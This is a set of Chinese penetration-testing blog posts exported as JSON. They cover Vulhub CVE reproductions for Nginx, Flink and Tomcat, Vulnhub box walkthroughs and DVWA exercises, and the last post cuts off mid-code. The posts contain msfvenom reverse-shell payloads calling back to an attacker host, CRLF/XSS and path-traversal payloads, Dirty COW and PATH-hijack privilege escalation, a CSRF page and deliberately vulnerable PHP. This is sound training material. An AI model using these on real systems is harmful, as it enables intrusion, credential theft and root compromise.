[{"title":"Vulhub|Nginx集合","url":"/5821439b.html","content":"0.靶场搭建参考作者[jpSpaceX]写的文章https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.Nginx 文件名逻辑漏洞（CVE-2013-4547）影响版本 : Nginx 0.8.41-1.4.3 / 1.5.0-1.5.7Vul : 文件上传Path :nginx/CVE-2013-4547Breakthrough：  \n\n（a）将写有php代码的文件保存为 .jpg格式 – 上传文件 – 访问 /&lt;_name&gt;.jpg – 显示存在文件（b）Nginx会匹配正则\\.php$，若匹配上则进入fastcgi处理 – 访问 /&lt;_name&gt;.jpg.php（希望服务器解析文件中的php代码） – 返回文件不存在（没有解析到）（c）访问 /&lt;_name&gt;.jpg.php – bp拦截，使用00截断（在.php前插入HexCode[00]） – 返回数据为空（还是没有解析到）（d）CVE-2013-4547：Nginx如果发现URI中存在空格[20]就会继续处理URI中的剩余部分，这说明了如果空格和截断符相邻[20][00]，nginx就不会检测到00截断，从而可以正常使用00截断。由于00截断fastcgi实际处理的文件为&lt;_name&gt;.jpg[20]，又因系统会自动将文件后缀末尾存在空格[20]修复为&lt;_name&gt;.jpg。（e）上传写有php代码的 .jpg[20]文件 – 访问 /&lt;_name&gt;.jpg – bp拦截 – 将uri参数修改为 /uploadfiles/&lt;_name&gt;.jpg[20][00].php – 重放，响应200 OK（此时应解析成功上传文件中的php代码） – 可尝试蚁剑连接验证  \n\n2.Nginx 整数溢出/越界读取缓存漏洞（CVE-2017-7529）影响版本 : Nginx 0.5.6-1.13.2Vul : 数据泄漏Path :nginx/CVE-2017-7529Breakthrough：  \n\n\nnginx可以当作一个缓存服务器，将web服务器的内容保存到服务器中， 如果客户端请求的内容已经有缓存了，那么可以直接将缓存内容返回，就需要再次请求服务器了，可降低应用服务器的负载。  \nCVE-2017-7529：请求中包含range头时，Nginx会根据指定rang1和rang2的位置返回指定长度的内容，若非首次的请求range命中了缓存文件 重复请求读取信息是从缓存中读取的，修改请求中的负数偏移量range的范围，即可定位读取到缓存中的敏感数据（原本并不会返回的）  \n\n（a）重复访问192.168.x.x:8080，curl -i 192.168.x.x:8080 – 返回的响应中X-Proxy-Cache：HIT说明非首次访问（首次是MISS）且Content-Length：612（b）计算range：\n\n\n\nrange\n公式\n计算方法\n\n\n\n\nrange1\nrange1 = ContentLength + 605(↑)\n为了向前读取数据，差值最好保持在605+\n\n\nrange2\nrange2 = 8000000000000000 - range1\n总值0x8000000000000000减去rang1\n\n\n\n（c）故该请求需构造为curl -i http://192.168.x.x:8080/ -r -1217,-7999999999998783 – 这里我手动复现不出来 – 使用靶场环境自带的poc.py能够复现该漏洞  \n\n3.Nginx Insecure-configurationVul : CRLF注入(HRS)、目录穿越、add_header失效Path :nginx/insecure-configurationBreakthrough：\nCRLF注入漏洞（HRS）  \n\n错误的配置文件示例：location / &#123;  \n   return 302 https://$host$uri; //（原本的目的是为了让http的请求跳转到https上）  \n&#125;  Nginx会将$uri进行解码，导致传入%0a%0d即可引入换行符，造成CRLF注入漏洞。（a）payload http://192.168.x.x:8080/%0a%0dSet-Cookie:%20a=1 //注入Set-Cookie头，设置了一个SESSION，造成一个会话固定漏洞（b）payload http://192.168.x.x:8080/%0a%0dX-XSS-Protection:%200%0a%0d%0a%0d&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; //注入X-XSS-Protection:0绕过浏览器Fliter，进行xss注入  \n\n目录穿越  \n\n错误的配置文件示例：location /files &#123;  \n   alias /home/; //（原本的目的是为了让用户访问到/home/目录下的文件）  \n&#125;  Nginx在配置别名（alias）的时候，如果原名/files尾部忘记加/，将造成一个目录穿越漏洞。payload http://192.168.x.x:8081/files../  \n\nadd_header失效  \n\n错误的配置文件示例：add_header Content-Security-Policy \"default-src 'self'\"; // 父块（整站）中add_header设置了相关安全规则   \nadd_header X-Frame-Options DENY;  \nlocation = /test1 &#123;  \n   rewrite ^(.*)$ /xss.html break;  \n&#125;  \nlocation = /test2 &#123;  \n   add_header X-Content-Type-Options nosniff; //但/test2的location中又有add_header设置了X-Content-Type-Options，导致父块add_header的设置被覆盖而失效  \n   rewrite ^(.*)$ /xss.html break;  \n&#125;  Nginx配置文件子块（server、location、if）中的add_header，将会覆盖父块中的add_header添加的HTTP头，造成一些安全隐患。  \n\n","categories":["渗透测试"],"tags":["Nginx","Vulhub"]},{"title":"Vulhub|Flink集合","url":"/338e3c98.html","content":"0.靶场搭建参考作者[jpSpaceX]写的文章https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.Apache Flink Upload Path Traversal (CVE-2020-17518)影响版本 : Flink 1.5.1-1.11.2Path : flink/CVE-2020-17518Vul : 文件上传Breakthrough：  \n\n（a）msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.x.x LPORT=444 -f jar -o shell.jar – 上传生成的.jar文件 – 上传成功（b）msf开启监听 – 前端Submit上传的.jar包 – msf这里使用shell命令getshell  \n\n2.Apache Flink jobmanager/logs Path Traversal (CVE-2020-17519)影响版本 : Flink 1.11.0-1.11.2Path : flink/CVE-2020-17519Vul : 目录穿越Breakthrough：  \n\n已经给出了存在目录穿越的目录jobmanager/logs – 访问http://&lt;aim_ip&gt;:&lt;aim_port&gt;/jobmanager/logs – bp拦截 – 修改GET参数为 /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd  – 能够返回/etc/passwd文件内容  \n\n","categories":["渗透测试"],"tags":["Flink","Vulhub"]},{"title":"Vulhub|Tomcat集合","url":"/386f84ef.html","content":"0.靶场搭建参考作者[jpSpaceX]写的文章https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.Tomcat7+ Weak Password &amp;&amp; Backend Getshell Vulnerability影响版本 : Tomcat8.0Vul : 弱口令、文件上传Path : tomcat/tomcat8Breakthrough：  \n\n（a）tomcat默认口令：\n\n\n\nusername\npassword\n\n\n\n\nadmin\n\n\n\nadmin\nadmin\n\n\ntomcat\ntomcat\n\n\n\n（b）msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.x.x LPORT=444 -f war -o shell.war – 上传生成的.war文件 – 抓包 – 从上传成功的响应中得到上传文件的路径 /shell/&lt;jsp_name&gt;.jsp（c）msf开启监听 – 浏览器访问上传文件路径 – msf这里使用script命令getshell  \n\n2.Tomcat Arbitrary Write-file Vulnerability through PUT Method (CVE-2017-12615)影响版本 : Apache Tomcat 7.0.0-7.0.79（7.0.81修复不完全）Vul : 文件上传Path : tomcat/CVE-2017-12615Breakthrough：    \n\n（a）nikto -h 192.168.x.x -p 8080 扫一下发现网站根目录下可以PUT（b）在根目录下刷新网站 – bp拦截 – 将请求改为PUT，写入jsp木马 – 重放（c）这里请求包里PUT的文件名直接使用 /shell.jsp 不能成功上传，需在文件名后缀添加/、::$DATA、%20或.即可绕过 – 成功上传 – 蚁剑连接  \n\n3.Apache Tomcat AJP Arbitrary File Read / Include Vulnerability（CVE-2020-1938）影响版本 : Apache Tomcat 6 / 7-7.0.100 / 8-8.5.51 / 9-9.0.31 Vul : 文件包含Path : tomcat/CVE-2020-1938Breakthrough：  \n\n这个不知道如何手动复现，直接利用了msf的ajp相关exp。  \n\n","categories":["渗透测试"],"tags":["Tomcat","Vulhub"]},{"title":"Vulnhub|DarkHole1","url":"/480ec251.html","content":"0.靶机安装\n不再赘述，可看之前的Vulnhub相关文章。  \n\n1.信息收集\nnmap扫描nmap -sn 192.168.xxx.0/24发现目标主机ip。nmap -sS -Pn -A -p- -n 192.168.228.129 扫一下详细信息，发现启用了22和80端口。  \n\n2.(80端口)Web\n访问http://192.168.228.129发现是一个登陆页面，靶机介绍页提示了不要把时间浪费在爆破上，故这里注册一个账号登陆进去看看是什么，以username=admin注册时，提示用户名已存在：使用注册的账号登陆成功，GET请求传递参数id=2，这里猜测id=1就是用户admin，直接把url中的id=2改为id=1验证是否存在越权，前端提示：”Your Not Allowed To Access another user information”。有一个修改密码的入口，修改密码使用bp拦截一下，修改POST的传参id=1，修改成功：使用[账户：密码][admin：123456]登录，登陆成功，成功获取admin权限。  \n\n3.getshell\n\n2021-12-03发布的getshell相关文章getshell   \n\nadmin权限包含一个上传文件的功能，直接上传一句话木马 .php文件，前端页面提示”Sorry , Allow Ex : jpg,png,gif “，这里尝试了4种办法都没有成功getshell。  \n\n（a）bp拦截-将Content-Type: application/x-php改为Content-Type: imge/jpg-重放；（b）bp拦截-Hex模式下对传入文件名进行00截断（在.php与.jpg之间插入Hex Code）-重放\n\n(在php&lt;5.3.4中，处理字符串的函数认为0x00是终止符。%00在url语言里代表空格“ ”，因此它起到的作用就是截断文件的后半段，让它识别到的文件格式是.jpg，而解析时会是前面的脚本格式。)；\n\n（c）在木马文件 .php头部加上jpg格式的GIF89进行欺骗-上传成功-但上传的文件仍是以 .jpg为后缀，无法执行其中的php代码，此处也找不到可以FileInclusion的地方。（d）copy /b a.jpg+shell.php shell.jpg将木马写入图片末端-上传成功-但上传的文件仍是以 .jpg为后缀，无法执行其中的php代码，此处也找不到可以FileInclusion的地方。  \n\n看了网上其他人的思路，发现自己刻板局限地认为上传文件的白名单只有前端提示的jpg、png和gif。其实只要将木马文件后缀改为phtml也能够上传成功并成功解析php代码。这里使用msfvenom生成反弹shell代码文件msfshell.php：msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.228.128 lport=443 -o msfshell.php文件生成后把代码&lt;?php前多余的部分删掉，把文件后缀改为 .phtml，成功上传文件。查看上传成功的响应报文能获得服务器的文件上传路径 /upload/&lt;木马文件&gt;使用msfconsole进行监听：use exploit&#x2F;multi&#x2F;handler  \nset payload php&#x2F;meterpreter&#x2F;reverse_tcp  \nset lhost 192.168.228.128 &#x2F;&#x2F;同msfvenom生成反弹shell代码中设置的lhost  \nset lport 443 &#x2F;&#x2F;同msfvenom生成反弹shell代码中设置的lport  \nrun  在浏览器访问 http://192.168.228.128/upload/msfshell.phtml，getshell成功，升级为交互式shell：登录用户www-data权限较低，没有获取到什么信息。\n\n这里我尝试过使用一句话木马+蚁剑连接进入shell，但蚁剑的shell没法进行后面的export PATH，不知道是为什么？  \n\n\n4.提权\n\n2021-12-01发布的提权相关文章提权  \n\ncat /etc/passwd | grep /bin/bash发现三个用户root、darkhole和john，去darkhole的工作路径 /home/darkhole下没有发现什么。去john的工作路径 /home/john下ls -la查看，发现password、user.txt、file.py和toto文件，password、user.txt和file.py都没有权限，故从toto文件入手，发现toto文件具有s权限（设置使文件在执行阶段具有文件所有者的权限，相当于临时拥有文件所有者的身份。）：  \n./toto 执行toto文件，发现是以john身份执行的一个id命令，故使用劫持环境变量提权：1-在/tmp创建一个id命令文件并赋权：echo &quot;/bin/bash&quot;&gt;/tmp/id &amp;&amp; chmod 777 /tmp/id2-把当前/tmp目录添加到环境变量PATH：export PATH=/tmp:$PATH3-执行toto文件：./toto新增的环境变量目录会添加在$PATH最前(左)端，执行id命令的时候会优先从当前目录下查找程序，所以id命令会被劫持（期望执行的是id，但实际执行的是被写入path的id文件中的命令）。拿到john的shell：cat password拿到密码root123。cat user.txt拿到flagDarkHole{You_Can_DO_It}。以john身份想进入 /root还是权限不够，还需进一步提权。整理一下现在得到的信息，三个用户root、john和darkhole，一个密码root123。这里有两个途径提升到root权限：(1)以john进行sudo提权：  \n\nsudo -l查看发现john有对 /home/john/file.py执行python3的sudo权限。echo &quot;import os;os.system(&#39;/bin/bash&#39;)&quot;&gt;/home/john/file.py将python的getshell代码写入/home/john/file.py。sudo python3 /home/john/file.py执行file.py。   \n\n(2)利用darkhole进行提权：  \n\nsu darkhole切换账户，输入密码root123（经过尝试john和darkhole都能使用这个密码）sudo -l查看发现darkhole具有的sudo权限为 (ALL:ALL)，故此出可以直接使用sudo -i命令进行提权。sudo -i：Linux终端命令下改变用户对命令使用权限的命令，获得的是root用户的环境。sudo -s：执行环境变量中的 SHELL 所指定的 shell，或是 /etc/passwd 里所指定的 shell 。获得的是本身用户的环境。  \n\n拿到root的shell后 cat /root/root.txt 拿flagDarkHole{You_Are_Legend}。 \n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","劫持环境变量提权","FileUpload"]},{"title":"Vulnhub|Sumo","url":"/3a00fd33.html","content":"0.靶机安装\n不再赘述，可看之前的Vulnhub相关文章。  \n\n1.信息收集\nnmap扫描nmap -sn 192.168.xxx.0/24发现目标主机ip。nmap -sS -Pn -A -p- -n 192.168.117.142扫一下详细信息，发现启用了22和80端口。  \n\n2.(80端口)Web\nnikto -h 192.168.117.142扫一下目录和详细信息，发现 /cgi-bin/test目录可能存在漏洞CVE-2014-6278：  \n\n3.getshell\n\n2021-12-03发布的getshell相关文章getshell   \n\n用msfconsole搜一下expsearch CVE-2014-6278。找到一个cgi相关exp use exploit/multi/http/apache_mod_cgi_bash_env_exec。查看需要进行的配置show options，设置目标ipset rhost &lt;目标ip&gt; 和 可能存在漏洞的uri  set targeturi /cgi-bin/test。run，getshell成功，用python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;转成交互式shell。当前用户www-data没有什么权限。  \n\n4.提权\n\n2021-12-01发布的提权相关文章提权  \n\n尝试sudo、suid、写入/etc/passwd和利用cron*都无法提权。lsb_release -a和uname -a查看一下靶机系统内核，是2012年的Linux系统。现在想办法把脏牛漏洞扫描器dirtycowscan.sh传到靶机上，由于不知道具有ssh登录权限的账户密码，这里用wget的方法上传。把脏牛漏洞扫描器dirtycowscan.sh放进攻击机kali的 /vat/www/html目录下，service apache2 restart重启攻击机kali的apache服务。现在在靶机的shell上应可以通过wget http://&lt;攻击机ip&gt;/&lt;目标文件path&gt;来下载目标文件。\n\n但此处要特别注意，当前靶机shell上的用户是www-data，在很多文件夹下都没有写权限，所以会出现下载失败的情况。  \n\n所以在靶机shell上需要先切换到 /tmp目录，再wget http://192.168.117.128/dirtycowscan.sh才能成功下载dirtycowscan.sh。chmod +x dirtycowscan.sh 在靶机上给dirtycowscan.sh赋权（需要执行），./dirtycowscan.sh -s执行脏牛漏洞扫描器，系统IS vulnerable存在脏牛提权漏洞。通过g++ -V和gcc -V查看靶机编译环境，发现有C语言的编译环境。在攻击机上searchsploit dirty，找到合适的exp脚本，在靶机上同样用wget的方法把exp脚本下载下来。   \ncat &lt;exp脚本文件&gt; | grep gcc //查看c源代码的编译命令gcc -pthread 40839.c -o dirty -lcrypt //编译→生成编译文件dirty./dirty //运行  \n按照提示输入自定义密码，程序会用这个自定义密码生成一个具有root权限的用户，再将这个用户写入并替换靶机的/etc/passwd。脚本程序运行结束后，回到靶机www-data用户的shell，通过su切换具有root权限的用户，输入刚才在脚本程序运行过程中自定义的密码，即可提权成功。cat /root/root.txt进入root目录拿flag：{Sum0-SunCSR-2020_r001}。  \n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","脏牛提权","Metasoploit","searchsploit"]},{"title":"Vulnhub|Lampiao","url":"/9f3820f2.html","content":"0.靶机安装\n不再赘述，可看之前的Vulnhub相关文章。  \n\n1.信息收集\nnmap扫描nmap -sn 192.168.xxx.0/24发现目标主机ip。nmap -sS -Pn -A -p- -n 192.168.117.141扫一下详细信息。靶机开放了22(ssh)、80(http)和1898(http)端口。  \n\n2.(80、1898)Web\n由1.信息收集可知80端口没有什么内容，1898端口下有很多目录，主要从1898端口下手。访问http://192.168.117.141:1898/CHANGELOG.txt，获得版本信息Drupal 7.54, 2017-02-01。  \n\n3.getshell\n\n2021-12-03发布的getshell相关文章getshell   \n\n用msf找一下exp msf5&gt; search drupal。设置好所需条件-run，getshell成功，通过python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;转成交互式shell。cat /etc/passwd 发现用户tiago:查看了tiago的工作目录 /html/tiago 和其他关键目录 /var/html，都没有发现什么。一般网站有数据库的配置文件，尝试查找下drupal网站的配置信息。在sites目录下的默认配置文件default中有setting.php。cat /var/www/html/sites/default/setting.php，找到数据库名drupal、数据库用户drupaluser和密码Virgulino。mysql -u drupaluser -p登录数据库。查看users表，tiago的密码无法解码。直接用账户tiago和密码Virgulino尝试ssh登录，成功。浏览了系统，没有发现什么。www-data和tiago都进不去 /root。\n\n4.提权\n\n2021-12-01发布的提权相关文章提权  \n\n尝试sudo、suid、写入/etc/passwd和利用cron*都无法提权。lsb_release -a和uname -a查看靶机内核。由于已经知道了可ssh登录的账号tiago和密码Virgulino，故可尝试脏牛提权。scp /root/tools/scan-dirtycow-master/dirtycowscan.sh tiago@192.168.117.141:/home/tiago将脏牛漏洞扫描器传到靶机上。在靶机运行扫描脚本，显示存在漏洞。在攻击机上searchsploit dirty，同样用scp上传到靶机：在靶机查看刚才上传的exp文件vim 40847.cpp，文件内会给出编译命令g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil，执行编译命令，形成编译文件dcow，./dcow -s运行dcow，提权成功。拿到root权限后，进入 /root，找到flag.txt，获得flag。\n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","脏牛提权","Metasoploit","searchsploit"]},{"title":"DVWA|FileInclusion","url":"/4d5d77bb.html","content":"0.漏洞原理\nFile Inclusion：文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到自己的目的。  \n\n服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。  \n该漏洞涉及到php常见包含文件函数包括：\n\ninclude()：当使用该函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。  \ninclude_once()：功能和include()相同，区别在于当重复调用同一文件时，程序只调用一次。  \nrequire()：require()与include()的区别在于require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行。使用require()函数包含文件时，只要程序一执行，立即调用文件，而include()只有程序执行到函数时才调用.require()在php程序执行前执行，会先读入require所指定引入的文件，使它变成PHP程序网页的一部分。  \nrequire_once()：它的功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。  \n\n\n\n\n\n1.Low_level1.1 尝试攻击\n当点击file1时，跳转的url为http://localhost/DVWA-master/vulnerabilities/fi/?page=file1.php，将参数file1.php改为```../../php.ini```：![avatar][img1]成功查看服务器php.ini文件。\n\n可以看到magic_quote_gpc=off，PHP4.0及以上版本中，该选项默认开启；PHP5.4之后的版本已删除该选项。在小于PHP5.3.4的服务器中，magic_quote_gpc=off时，可以在文件名中使用%00截断（%00后的内容不会被识别，可借此绕过某些过滤规则）。  \n\n在远程服务器上传一个phpshell.txt文件：![avatar][img2]\n\n","categories":["渗透测试"],"tags":["DVWA","FileInclusion"]},{"title":"DVWA|CommandInjection","url":"/b9aee5c3.html","content":"0.漏洞原理\n在操作中系统中 &amp;、&amp;&amp;、|、|| 都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。&amp;&amp;和&amp;的区别在于，&amp;&amp;是执行完前面的命令然后执行后面的命令，&amp;是不管前面的命令是否值执行，后面的都执行。  \n\n1.Low_level1.1 尝试注入\n在ip地址后输入&amp;ipconfig：  \n\n1.2 源代码\n&lt;?php \nif(isset($_POST['Submit'])) &#123;\n   // Step1 代码接收用户输入的ip  \n   $target = $_REQUEST['ip'];   \n   // Step2 根据操作系统的区别，对接收ip执行命令不同的ping操作\n   if(stristr(php_uname('s'),'Windows NT'))&#123;\n       //Windows\n       $cmd = shell_exec('ping'.$target);\n   &#125;\n   else&#123;\n       //*nix\n       $cmd = shell_exec('ping -c 4'.$target);\n   &#125;\n   // Final 反馈结果没有进行任何过滤或限制\n   $html .= \"&lt;pre>&#123;$cmd&#125;&lt;/pre>\";\n&#125;\n?>\n\n2.Medium_level2.1 尝试注入\n在ip地址后输入&amp;ipconfig：  \n\n2.2 源代码\n&lt;?php\nif (isset($_POST['Submit']))&#123;\n   // Step1 代码接收用户输入的ip  \n   $target = $_REQUEST['ip'];\n   // Step2 设置过滤列表  \n   $subtitutions = array(\n       '&amp;&amp;' => '', //过滤了'&amp;&amp;'  \n       ';' => '', //过滤了';'  \n   );\n   // Step3 将接收到的输入中与过滤列表匹配的字符过滤  \n   $target = str_replace(array_keys($substitutions),$substitutions,$target);\n   // Step4 根据操作系统的区别，对接收ip执行命令不同的ping操作\n   if(stristr(php_uname('s'),'Windows NT'))&#123;\n       //Windows\n       $cmd = shell_exec('ping'.$target);\n   &#125;\n   else&#123;\n       //*nix\n       $cmd = shell_exec('ping -c 4'.$target);\n   &#125;\n   // Final 过滤列表之过滤了\"&amp;&amp;\"和\";\"，可以使用其他命令字符注入  \n   $html .= \"&lt;pre>&#123;$cmd&#125;&lt;/pre>\";\n&#125;\n?>\n\n3.High_level3.1 尝试注入\n在ip地址后输入|ipconfig：  \n\n3.2 源代码\n&lt;?php \nif (isset($_POST['Submit']))&#123;\n   // Step1 代码接收用户输入的ip  \n   $target = $_REQUEST['ip'];\n   // Step2 设置过滤列表  \n   $subtitutions = array(\n       '&amp;' => '',\n       '&amp;&amp;' => '',   \n       ';' => '', \n       '| ' => '', //仔细看这里过滤的是'| ',意味着'|'仍可利用\n       '-' => '',\n       '$' => '',\n       '(' => '',\n       ')' => '',\n       '`' => '',\n       '||' => '',\n   );\n   // Step3 将接收到的输入中与过滤列表匹配的字符过滤  \n   $target = str_replace(array_keys($substitutions),$substitutions,$target);\n   // Step4 根据操作系统的区别，对接收ip执行命令不同的ping操作\n   if(stristr(php_uname('s'),'Windows NT'))&#123;\n       //Windows\n       $cmd = shell_exec('ping'.$target);\n   &#125;\n   else&#123;\n       //*nix\n       $cmd = shell_exec('ping -c 4'.$target);\n   &#125;\n   // Final High等级的过滤列表比Medium增加了字符    \n   $html .= \"&lt;pre>&#123;$cmd&#125;&lt;/pre>\";\n?>\n\n4.Impossible_level4.1 源代码\n&lt;?php\nif(isset($_POST['Submit']))&#123;\n   checkToken($_REQUEST['user_token'],$_SESSION['session_token'],'index.php');//加入了Anti-CSRF Token\n   $target = $_REQUEST['ip'];\n   $target = stripslashes($target); //该函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。  \n   $octet = explode(\".\",$target); //该函数把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。  \n   if((is_numeric($octet[0]))&amp;&amp;(is_numeric($octet[1]))&amp;&amp;(is_numeric($octet[2]))&amp;&amp;(is_numeric($octet[3]))&amp;&amp;(sizeof($octet)==4))&#123; //检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。  \n       $target = $octet[0].'.'.$octet[1].'.'.$octet[2].'.'.$octet[3];//只有[int.int.int.int]格式的输入才执行\n       if(stristr(php_uname('s'),'Windows NT'))&#123;\n           $cmd = shell_exec('ping'.$target);\n       &#125;\n       else&#123;\n           $cmd = shell_exec('ping -c 4'.$target);\n       &#125;\n       $html .= \"&lt;pre>&#123;$cmd&#125;&lt;/pre>\";\n   &#125;\n   else&#123;\n       $html .= '&lt;pre>ERROR:You have entered an incalid IP.&lt;/pre>';\n   &#125;\n   \n&#125;\ngenerateSessionToken();\n?>\n\n","categories":["渗透测试"],"tags":["DVWA","CommandInjection"]},{"title":"DVWA|CSRF","url":"/18030393.html","content":"0.漏洞原理\n\n一个讲的很好的博客推荐阅读:浅谈CSRF攻击方式\n\n\n1.Low_level1.1 尝试攻击\n获取修改密码时使用的url，将url改造为自己需要密码，直接点击url，没有验证身份也可成功修改密码。构造攻击csrf_low.html页面：&lt;img src=\"http://192.168.117.129/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#\" border=\"0\" style=\"display:none;\"/>\n&lt;h1>404&lt;h1>\n&lt;h2>file not found.&lt;h2>  访问csrf_low.html后，退出DVWA重新登录，可以使用密码123456登录。   \n\n1.2 源代码\n&lt;?php\nif( isset( $_GET[ 'Change' ] ) ) &#123;\n// Get input \n$pass_new  = $_GET[ 'password_new' ];\n$pass_conf = $_GET[ 'password_conf' ];\n// Do the passwords match?\nif( $pass_new == $pass_conf ) &#123;// 校验pass_new是否等于pass_conf\n\t// They do! \n\t$pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n\t$pass_new = md5( $pass_new );\n\t// Update the database 更新密码\n\t$insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\";\n\t$result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $insert ) or die( '&lt;pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre>' );\n\t// Feedback for the user\n\t$html .= \"&lt;pre>Password Changed.&lt;/pre>\";\n&#125;\nelse &#123;\n\t// Issue with passwords matching\n\t$html .= \"&lt;pre>Passwords did not match.&lt;/pre>\";\n&#125;\n((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);\n&#125;\n?>\n\n2.Medium_level2.1 尝试攻击\n用Low_level的攻击方式进行尝试，访问攻击页面csrf_low.html后无法成功修改密码：先看一下源代码。\n\n2.2 源代码\n&lt;?php\nif( isset( $_GET[ 'Change' ] ) ) &#123;\n// 加上了对用户请求头的中的Referer字段进行验证,即用户的请求头中的Referer字段必须包含了服务器的名字。\nif( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) &#123;\n\t// Get input\n\t$pass_new  = $_GET[ 'password_new' ];\n\t$pass_conf = $_GET[ 'password_conf' ];\n\t// Do the passwords match?\n\tif( $pass_new == $pass_conf ) &#123;\n\t\t// They do!\n\t\t$pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n\t\t$pass_new = md5( $pass_new );\n\t\t// Update the database\n\t\t$insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\";\n\t\t$result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $insert ) or die( '&lt;pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre>' );\n\t\t// Feedback for the user\n\t\t$html .= \"&lt;pre>Password Changed.&lt;/pre>\";\n\t&#125;\n\telse &#123;\n\t\t// Issue with passwords matching\n\t\t$html .= \"&lt;pre>Passwords did not match.&lt;/pre>\";\n\t&#125;\n&#125;\nelse &#123;\n\t// Didn't come from a trusted source\n\t$html .= \"&lt;pre>That request didn't look correct.&lt;/pre>\";\n&#125;\n((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);\n&#125;\n?>\n\n2.3 再次尝试攻击\n通过源代码可知，程序校验了请求报文中的Referer，表示来源地址，防止了从不知名页面的跳转。fiddler抓包，对比发现成功修改密码与失败的请求报文的区别，二者Referer不同：可以通过编辑 .html 文件名，来使 Referer 参数包含服务器ip地址：【192.168.117.129_csrf_medium.html】访问http://172.16.0.166/192.168.117.129_csrf_medium.html，fiddler抓包显示修改密码成功。  \n\n3.High_level3.1 源代码\n&lt;?php\nif( isset( $_GET[ 'Change' ] ) ) &#123;\n// 反CSRF的验证token机制，服务器收到token后，会首先检查token，只有token正确，才会继续处理客户端的请求。\ncheckToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );\n// Get input\n$pass_new = $_GET[ 'password_new' ];\n$pass_conf = $_GET[ 'password_conf' ];\n// Do the passwords match?\nif( $pass_new == $pass_conf ) &#123;\n// They do!\n$pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n$pass_new = md5( $pass_new );\n// Update the database\n$insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\";\n$result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ) or die( '&lt;pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre>' );\n// Feedback for the user\necho \"&lt;pre>Password Changed.&lt;/pre>\";\n&#125;\nelse &#123;\n// Issue with passwords matching\necho \"&lt;pre>Passwords did not match.&lt;/pre>\";\n&#125;\n((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);\n&#125;\n// 